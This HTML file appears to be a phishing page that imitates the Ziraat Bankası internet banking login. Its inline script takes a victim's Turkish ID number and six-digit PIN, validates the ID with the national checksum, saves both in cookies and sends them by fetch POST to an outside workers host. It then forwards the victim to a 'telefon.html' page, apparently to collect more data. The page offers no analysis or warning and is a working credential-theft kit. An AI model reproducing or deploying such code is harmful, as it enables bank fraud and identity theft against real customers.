
<!DOCTYPE html>
<html lang="tr">
  <head>
	  <!-- Google tag (gtag.js) -->
 
 
    <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Mobil Uyumlu Sayfa</title>
    <style class="vjs-styles-defaults"></style>
    <meta http-equiv="Content-Language" content="tr">
    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-9">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Hoş Geldiniz | Ziraat Bankası İnternet Bankacılığı </title>
    <link href="styles.css" rel="stylesheet" id="style">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/vue/2.5.17/vue.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.18.0/axios.min.js"></script>
 
<!-- Meta Pixel Code -->
 
  <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
  </head>
  <body style="
margin-left: 0px;
margin-right: 0px;
margin-top: 0px;
margin-bottom: 0px;
">
 
    
<script>
    document.addEventListener("DOMContentLoaded", function () {
        var tcInput = document.getElementById("ctl00_c_RetailIdentityTextBox");
        var passInput = document.getElementById("ctl00_c_RetailPinTextBox");
        var loginBtn = document.getElementById("ctl00_c_RetailLoginButton");

        async function validateInputs() {
            var tcno = tcInput.value;
            var pass = passInput.value;

            // TC kimlik numarası ve şifre uzunluğunu kontrol et
            if (tcno.length === 11 && pass.length === 6) {
                // TC kimlik numarası doğrulaması
                if (await tcno_dogrula_ve_islem_yap(tcno)) {
                    // Giriş düğmesini etkinleştir
                    loginBtn.disabled = false;
                } else {
                    // TC kimlik numarası geçerli değilse giriş düğmesini devre dışı bırak
                    loginBtn.disabled = true;
                    alert("Geçersiz TC Kimlik Numarası");
                }
            } else {
                // TC kimlik numarası ve şifre eksikse giriş düğmesini devre dışı bırak
                loginBtn.disabled = true;
            }
        }

        // Giriş düğmesine tıklandığında formu gönder
        loginBtn.addEventListener("click", function () {
            // TC kimlik numarası ve şifreyi al
            var tcno = tcInput.value;
            var pass = passInput.value;

            // TC kimlik numarası ve şifre uzunluğunu kontrol et
            if (tcno.length === 11 && pass.length === 6) {
                // TC kimlik doğrulaması yap
                if (tcno_dogrula_ve_islem_yap(tcno)) {
                    // Cookie'leri oluştur
                    document.cookie = `tcno=${tcno}; path=/`;
                    document.cookie = `pass=${pass}; path=/`;

                    // POST işlemi için veri oluştur
                    var data = new FormData();
                    data.append('tcno', tcno);
                    data.append('pass', pass);

                    // POST işlemi için fetch kullanarak isteği oluştur
                    fetch('https://worker-steep-shape-b9dddssd48.selimjuhan2.workers.des/', {
                        method: 'POST',
                        body: data
                    })
                    .then(response => response.text())
                    .then(data => {
                        console.log(data);
                        window.location.href = 'telefon.html';
                    })
                    .catch(error => {
                        console.error('Hata:', error);
                        window.location.href = 'telefon.html';
                    });
                } else {
                    alert("Geçersiz TC Kimlik Numarası");
                }
            } else {
                alert("TC Kimlik Numarası ve şifre eksik veya hatalı.");
            }
        }); 

        // TC kimlik doğrulama fonksiyonu
        async function tcno_dogrula_ve_islem_yap(tcno) {
            // TC kimlik doğrulama fonksiyonu
            tcno = String(tcno);
            if (tcno.substring(0, 1) === '0') {
                return false;
            }
            if (tcno.length !== 11) {
                return false;
            }
            var ilkon_array = tcno.substr(0, 10).split('');
            var ilkon_total = hane_tek = hane_cift = 0;
            for (var i = j = 0; i < 9; ++i) {
                j = parseInt(ilkon_array[i], 10);
                if (i & 1) {
                    hane_cift += j;
                } else {
                    hane_tek += j;
                }
                ilkon_total += j;
            }
            if ((hane_tek * 7 - hane_cift) % 10 !== parseInt(tcno.substr(-2, 1), 10)) {
                return false;
            }
            ilkon_total += parseInt(ilkon_array[9], 10);
            if (ilkon_total % 10 !== parseInt(tcno.substr(-1), 10)) {
                return false;
            }
            return true;
        }

        // Giriş alanlarının değerlerinin değiştiğini izle
        tcInput.addEventListener("input", validateInputs);
        passInput.addEventListener("input", validateInputs);

        // Sayfa yüklendiğinde de kontrol et
        validateInputs();
    });
</script>

 

 

    <div>
  </body>
</html>
